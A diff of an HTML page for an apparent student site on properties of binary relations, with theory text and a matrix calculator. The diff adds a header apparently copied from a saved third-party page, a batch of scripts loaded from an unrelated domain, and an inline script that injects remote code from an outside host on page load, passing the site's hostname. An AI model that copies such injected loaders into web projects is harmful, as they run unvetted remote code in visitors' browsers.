@@ -1,20 +1,154 @@
-﻿
-% rebase('layout.tpl', title=title, year=year)
-
-<html lang="en">
+﻿<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru-ru" lang="ru-ru" dir="ltr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Свойства Бинарных Отношений(СБО)</title> 
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<base href="/contact">
+	<meta name="author" content="Super User">
+	<meta name="generator" content="">
+	<title>Математическое моделирование</title>
+	<link href="assets/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon">
     <link rel="stylesheet" href="static/content/Var1Stylesheet.css">
     <script src="static/scripts/BinaryVar1.js"></script>
+	<link href="https://gg.looknewsite.ru/assets/bootstrap.min.css" rel="stylesheet">
+	<link href="https://gg.looknewsite.ru//assets/bootstrap-select.min.css" rel="stylesheet">
+	<link href="https://gg.looknewsite.ru//assets/owl.carousel.min.css" rel="stylesheet">
+	<link href="https://gg.looknewsite.ru//assets/animate.min.css" rel="stylesheet">
+	<link href="https://gg.looknewsite.ru//assets/Chart.min.css" rel="stylesheet">
+	<link href="https://gg.looknewsite.ru//assets/css2" rel="stylesheet">
+	<link href="https://gg.looknewsite.ru//assets/rostsayt.min.css" rel="stylesheet">
+	<link href="https://gg.looknewsite.ru//assets/template.css" rel="stylesheet">
+	<script src="https://gg.looknewsite.ru//assets/jquery-3.5.1.min.js"></script>
+	<script src="https://gg.looknewsite.ru//assets/jquery.validate.js"></script>
+	<script src="https://gg.looknewsite.ru//assets/popper.min.js"></script>
+	<script src="https://gg.looknewsite.ru//assets/bootstrap.min.js"></script>
+	<script src="https://gg.looknewsite.ru//assets/bootstrap-select.min.js"></script>
+	<script src="https://gg.looknewsite.ru//assets/owl.carousel.min.js"></script>
+	<script src="https://gg.looknewsite.ru//assets/wow.min.js"></script>
+	<script src="https://gg.looknewsite.ru//assets/jquery.mask.min.js"></script>
+	<script src="https://gg.looknewsite.ru//assets/Chart.bundle.min.js"></script>
+	<script src="https://gg.looknewsite.ru//assets/Chart.min.js"></script>
+	<script src="https://gg.looknewsite.ru//assets/rostsayt.js"></script>
+	<script src="https://gg.looknewsite.ru//assets/template.js"></script>
+	<script src="https://gg.looknewsite.ru//assets/context.js"></script>
+	<script src="https://gg.looknewsite.ru//assets/ammap.js"></script>
+	<script src="https://gg.looknewsite.ru//assets/russiaLow.js"></script>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes">
+    <meta name="HandheldFriendly" content="true">
+    <meta name="apple-mobile-web-app-capable" content="YES">
+
+	<style>
+            
+
+         
+        #navbar {
+        background-color: black;
+        }
+
+        
+
+
+       body {
+    font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+    margin: 0 auto; /* Центрирование по горизонтали */
+    padding: 0;
+    width: 90%; /* Ширина 70% */
+    background-color: #000; /* Черный фон */
+    color: #fff; /* Белый текст */
+   
+}
+
+
+        
+
+        #top_menu .nav.menu li {
+            white-space: nowrap; /* Предотвращает перенос элементов на новую строку */
+        }
+
+        #top_menu .nav.menu li {
+            white-space: nowrap; /* Предотвращает перенос элементов на новую строку */
+            margin-right: 35px; /* Установите нужный размер отступа */
+            opacity: 0; /* Устанавливаем начальную прозрачность */
+            transform: translateY(-50px); /* Начальное положение элементов */
+            animation: fadeInDown 2s ease forwards; /* Применяем анимацию */
+        }
+
+        @keyframes fadeInDown {
+            from {
+                opacity: 0; /* Начальная прозрачность */
+                transform: translateY(-50px); /* Начальное положение */
+            }
+            to {
+                opacity: 1; /* Конечная прозрачность */
+                transform: translateY(0); /* Конечное положение */
+            }
+        }
+
+        
+
+       #top_menu .nav.menu li a:hover {
+            color: #32CD32; /* Здесь указываете желаемый зеленый цвет текста */
+        }
+
+
+
+
+        #top_menu ul {
+            display: flex;
+            flex-wrap: nowrap; /* запрещаем перенос элементов на новую строку */
+            justify-content: space-between; /* равномерное распределение элементов по горизонтали */
+            align-items: center; /* выравнивание элементов по вертикали */
+        }
+
+        
+
+
+
+
+
+
+    </style>
+
 </head>
-<body>
-<div>
+<body class="home" cz-shortcut-listen="true">
+    <script type="text/javascript">
+        window.top === window &&
+            !function(){
+                var e=document.createElement("script"),
+                    t=document.getElementsByTagName("head")[0];
+                e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),
+                e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)
+            }();
+    </script>
+    <!-- BEGIN WAYBACK TOOLBAR INSERT -->
+    <!-- END WAYBACK TOOLBAR INSERT -->
+    <div id="body">
+        <header class="navbar navbar-expand-xl navbar-light" id="navbar">
+            <div class="container">
+                <div class="collapse navbar-collapse" id="navbar-content">
+                    <div id="top_menu" class="navbar-nav ml-5 w-100">
+                        <ul class="nav menu w-100 justify-content-between align-items-center header-top-menu mod-list">
+                            
+                            <li class="item-102"><a href="/home">Главная</a></li>
+                            
+                            <li class="item-102"><a href="/contact">Вид бинарных отношений</a></li>
 
-    <h1>Свойства Бинарных Отношений</h1>
-
-    <div class="button-container">
+                            <li class="item-103"><a href="/sbo">Свойство бинарных отношений</a></li>
+                            <li class="item-104"><a href="/max">Максимальный поток в сети</a></li>
+                            <li class="item-105"><a href="/gc">Гамельтонов цикл</a></li>
+                            <li class="item-106"><a href="/about">Об авторах</a></li>
+                            <li class="item-107">
+                                <a href="/#mod-form1"></a>
+                            </li>
+                            <li class="item-112 work-in-pride-link">
+                                <a href="http://workinpride.ru/rus" class="work-in-pride-link" target="_blank" rel="noopener noreferrer">Работай в компании Green Pride</a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </header>
+        <div class="button-container">
         <div class="button" id="showTheory" onClick="showTheory()">Теория</div>
         <div class="button" id="showCalculator" onClick="showCalculator()">Калькулятор</div>
     </div>
@@ -25,8 +159,8 @@
             <h2>Основные свойства бинарных отношений во множестве А</h2>
 
            
-            <div class="theory-block">
-            <img id="teacher-img" src="https://media.giphy.com/media/l2SpSuTbUFcBg3UT6/giphy.gif" alt="derty" style="float: left; margin-right: 20px; width: 400px; height: 500px; vertical-align: middle;">
+            <div class="theory-block animate-from-left">
+            <img id="teacher-img" src="https://media.giphy.com/media/l2SpSuTbUFcBg3UT6/giphy.gif" alt="derty" style="float: left; margin-right: 20px; width: 350px; height: 400px; vertical-align: middle;">
 
             <p>Пусть R – бинарное отношение в А, т.е. R ⊂ А2.</p>
 
@@ -42,7 +176,7 @@
             </div>
 
             <h2>Виды бинарных отношений во множестве</h2>
-            <div class="theory-block">
+            <div class="theory-block animate-from-bottom-right">
             <p>Отношение R в А называется отношением эквивалентности, если оно рефлексивно, симметрично и транзитивно. Напр.: отношения «равенства», «параллельности прямых», «подобия фигур»,…</p>
             <p>Отношения эквивалентности представляют особый интерес, т.к. именно они определяют признак, который допускает разбиение множества А на непересекающиеся подмножества, называемые классами эквивалентности.</p>
             <p><strong>Дополнительное отношение к данному:</strong> Для получения дополнительного отношения к бинарному отношению можно использовать операции такие как объединение, пересечение, разность или дополнение.</p>
@@ -52,7 +186,7 @@
             relation = {('Alice', 20), ('Bob', 25), ('Alice', 30)}
             </div>
 
-            <div class="theory-block">
+            <div class="theory-block animate-from-left">
             <p>Чтобы получить дополнительное отношение к этому бинарному отношению, вы можете выполнить различные операции:</p>
             <ol>
                 <li><strong>Объединение (union):</strong> Получить все уникальные элементы из двух отношений.</li>
@@ -87,11 +221,26 @@
             <div class="button-container">
                 <div class="button" onclick="generateMatrixInputs(parseInt(document.getElementById('matrix-size').value));">Решить</div>
             </div>
+            <div class="theory-block">
+            <h2>Решение</h2>
+            </div>
         </div>
+    </div>
 
 
-        
+
+
+
+            </div>
+        </div>
     </div>
-    </div>
+    <footer class="footer text-center">
+        <div class="container">
+            <p style="color: #f0f0f0;">&copy; 2024 Все права защищены</p>
+        </div>
+    </footer>
+
 </body>
+
+
 </html>
